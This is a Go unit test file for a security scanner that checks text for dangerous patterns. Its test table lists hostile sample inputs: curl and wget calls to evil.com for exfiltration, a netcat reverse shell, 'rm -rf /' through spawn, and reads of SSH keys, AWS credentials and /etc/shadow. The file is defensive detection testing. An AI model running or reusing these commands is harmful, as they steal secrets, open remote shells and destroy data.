package security

import (
	"testing"
)

// ============== D27: 安全渗透测试 ==============

func TestSkillScanner_EncodedPayloads(t *testing.T) {
	scanner := NewSkillScanner()
	tests := []struct {
		name    string
		content string
		safe    bool
	}{
		{"plain safe", "Calculate the sum of two numbers", true},
		{"os.system direct", "os.system('whoami')", false},
		{"subprocess.Popen", "subprocess.Popen(['ls'])", false},
		{"eval injection", "eval(user_input)", false},
		{"exec injection", "exec(code_string)", false},
		{"curl exfil", "curl http://evil.com/steal", false},
		{"wget exfil", "wget http://evil.com/payload", false},
		{"netcat reverse shell", "nc -e /bin/sh 1.2.3.4 4444", false},
		{"path traversal ../../", "Read file at ../../etc/shadow", false},
		{"ssh key access", "Copy ~/.ssh/id_rsa to output", false},
		{"aws creds", "Read ~/.aws/credentials", false},
		{"base64+exec", "base64 decode and exec the payload", false},
		{"child_process node", "require('child_process').exec('ls')", false},
		{"spawn call", "spawn('/bin/sh', ['-c', 'rm -rf /'])", false},
		{"telnet", "telnet evil.com 1234", false},
		{"dotenv access", "Read ~/. env for secrets", true}, // space breaks pattern, OK
		{"safe python", "import pandas as pd\ndf = pd.read_csv('data.csv')", true},
		{"safe javascript", "const fs = require('fs')\nconst data = fs.readFileSync('file.txt')", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := scanner.Scan(tt.content)
			if tt.safe && err != nil {
				t.Errorf("expected safe, got violation: %v", err)
			}
			if !tt.safe && err == nil {
				t.Errorf("expected violation for: %s", tt.content)
			}
		})
	}
}

// 注：SSRF/ValidateURL 测试已随 ssrf.go 下沉到 toolkit/net/ssrf。
